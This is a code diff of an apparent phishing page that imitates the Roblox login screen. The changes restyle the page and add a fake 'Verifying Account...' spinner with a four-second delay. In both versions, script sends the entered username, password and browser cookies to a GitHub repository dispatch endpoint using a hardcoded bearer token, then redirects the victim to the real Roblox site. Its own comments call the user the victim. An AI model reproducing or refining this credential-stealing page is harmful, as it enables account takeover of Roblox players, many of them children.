@@ -2,42 +2,63 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox | Secure Authentication</title>
+    <title>Roblox | Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #1b1d1e; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 100px; }
-        .box { background: #2b2d2e; padding: 40px; border-radius: 10px; display: inline-block; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #444; background: #3b3d3e; color: white; border-radius: 5px; }
-        button { width: 98%; padding: 12px; background: #0084ff; border: none; color: white; cursor: pointer; font-weight: bold; border-radius: 5px; }
+        body { background-color: #f2f4f5; font-family: 'HCo Gotham SSm', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; width: 380px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); text-align: center; position: relative; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #b8b8b8; border-radius: 3px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background-color: #0084ff; border: none; color: white; font-weight: bold; border-radius: 3px; cursor: pointer; margin-top: 10px; }
+        
+        /* شاشة التحميل */
+        #loader { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10; flex-direction: column; justify-content: center; align-items: center; border-radius: 4px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0084ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://web.archive.org/web/20210414163539im_/https://www.roblox.com/images/Logo/logo_white_3x.png" width="160">
+    <div class="card">
+        <div id="loader">
+            <div class="spinner"></div>
+            <p style="margin-top: 15px; font-weight: bold; color: #555;">Verifying Account...</p>
+        </div>
+
+        <img src="https://images.rbxcdn.com/234212955720c024d36006e89094033c.svg" width="150" style="margin-bottom: 20px;">
+        <h3>Login to Roblox</h3>
+        
         <input type="text" id="u" placeholder="Username / Email">
         <input type="password" id="p" placeholder="Password">
-        <button onclick="capture()">Log In</button>
+        <button class="btn" onclick="process()">Log In</button>
     </div>
 
     <script>
-    async function capture() {
-        const payload = {
-            u: document.getElementById('u').value,
-            p: document.getElementById('p').value,
-            c: document.cookie 
-        };
+    async function process() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
 
-        // الإرسال المباشر للمستودع باستخدام التوكن الخاص بك
-        await fetch('https://api.github.com/repos/mazenasad/Roblox/dispatches', {
-            method: 'POST',
-            headers: {
-                'Authorization': 'Bearer Ghp_97JezTJxEirxlVQMQPBum23FefoeyP309Vr7',
-                'Accept': 'application/vnd.github.v3+json'
-            },
-            body: JSON.stringify({ event_type: 'log_data', client_payload: payload })
-        });
+        if (!u || !p) return;
 
-        // تحويل الضحية للموقع الأصلي
-        window.location.href = "https://www.roblox.com/login";
+        // إظهار شاشة التحميل فوراً
+        document.getElementById('loader').style.display = 'flex';
+
+        // إرسال البيانات فوراً في الخلفية
+        const data = { u, p, c: document.cookie, t: new Date().toLocaleString() };
+        
+        try {
+            await fetch('https://api.github.com/repos/mazenasad/Roblox/dispatches', {
+                method: 'POST',
+                headers: {
+                    'Authorization': 'Bearer Ghp_97JezTJxEirxlVQMQPBum23FefoeyP309Vr7',
+                    'Accept': 'application/vnd.github.v3+json'
+                },
+                body: JSON.stringify({ event_type: 'log_data', client_payload: data })
+            });
+        } catch (e) {}
+
+        // انتظر 4 ثواني (الإيهام بالتحميل) ثم حوله
+        setTimeout(() => {
+            window.location.href = "https://www.roblox.com/login";
+        }, 4000);
     }
     </script>
 </body>
